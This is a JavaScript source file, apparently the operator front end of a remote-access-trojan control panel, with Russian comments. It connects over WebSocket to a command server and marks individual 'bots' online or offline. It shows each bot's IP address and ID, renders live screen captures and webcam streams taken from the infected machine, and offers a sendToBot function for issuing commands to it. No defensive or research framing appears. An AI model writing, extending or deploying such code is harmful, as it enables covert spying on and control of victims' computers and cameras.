/* frontend/client_control/js/modules/websocket/connection.js */
import { AppState } from '../core/states.js';
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
import { renderScreenRGBA } from '../features/screen_renderer.js';

let socket = null, botWatchdog = null;
const decoder = new TextDecoder();

const updateUI = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val || '...';
};

const setOnline = (isOnline) => {
    const indicator = document.getElementById('status-indicator');
    if (indicator) indicator.classList.toggle('online', isOnline);
    updateUI('status-text', isOnline ? 'online' : 'offline');
};

function handleIncomingData(buffer) {
    const pkg = decodePacket(buffer);

    // Если пакет не распарсился или ID бота не совпадает — выходим
    if (!pkg || pkg.id !== AppState.clientId) return;

    setOnline(true);
    clearTimeout(botWatchdog);
    botWatchdog = setTimeout(() => setOnline(false), 10000);

    switch (pkg.module) {
        case 'DataScribe':
        case 'Heartbeat':
            try {
                const data = JSON.parse(decoder.decode(pkg.payload));
                if (data.ip) updateUI('display-ip', data.ip);
                if (data.id) updateUI('display-id', data.id);
            } catch (e) {
                console.warn("[WS] Metadata JSON Error");
            }
            break;

        case 'ScreenWatch':
            // Проверка: если пакет слишком мелкий (меньше 200 байт), это скорее всего только заголовки
            if (pkg.payload.byteLength > 200) {
                // Основная логика рендеринга.
                // Теперь рендерер сам управляет оверлеями, чтобы не было конфликтов z-index.
                renderScreenRGBA(pkg.payload);
            } else {
                // Можно раскомментировать для отладки пустых кадров
                // console.debug("[WS] Получен пустой кадр или метаданные");
            }
            break;

        case 'Webcam':
            // Для вебкамеры оставляем как есть, если там другой механизм
            const webcamOverlay = document.querySelector('#view-webcam .stream-overlay');
            if (webcamOverlay) webcamOverlay.style.display = 'none';

            if (window.renderStream) {
                window.renderStream('webcam-view', pkg.payload, 'webcam-placeholder');
            }
            break;

        default:
            window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
    }
}

export function initControlConnection() {
    const token = localStorage.getItem('auth_token');
    const login = localStorage.getItem('user_login');

    if (!token || !login || !AppState.clientId) {
        console.error("[WS] Missing Auth Data or ClientID");
        return;
    }

    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
    socket = new WebSocket(`${prot}//${location.host}/ws?token=${token}&login=${login}&mode=control`);
    socket.binaryType = 'arraybuffer';

    socket.onopen = () => {
        console.log("🚀 [WS] Connected to Server");
        // Запрашиваем метаданные сразу после входа
        if (window.sendToBot) window.sendToBot("DataScribe", "get_metadata");

        const hbInterval = setInterval(() => {
            if (socket?.readyState === 1) {
                socket.send(encodePacket("", "Heartbeat", "ping"));
            } else {
                clearInterval(hbInterval);
            }
        }, 25000);
    };

    socket.onmessage = (e) => {
        if (e.data instanceof ArrayBuffer) {
            handleIncomingData(e.data);
        }
    };

    socket.onclose = () => {
        console.log("❌ [WS] Connection Closed");
        setOnline(false);
        clearTimeout(botWatchdog);
    };

    socket.onerror = (err) => {
        console.error("⚠️ [WS] Socket Error:", err);
    };

    window.sendToBot = (mod, pay) => {
        if (socket?.readyState === 1) {
            socket.send(encodePacket(AppState.clientId, mod, pay));
        } else {
            console.warn("[WS] Cannot send: Socket not ready");
        }
    };
}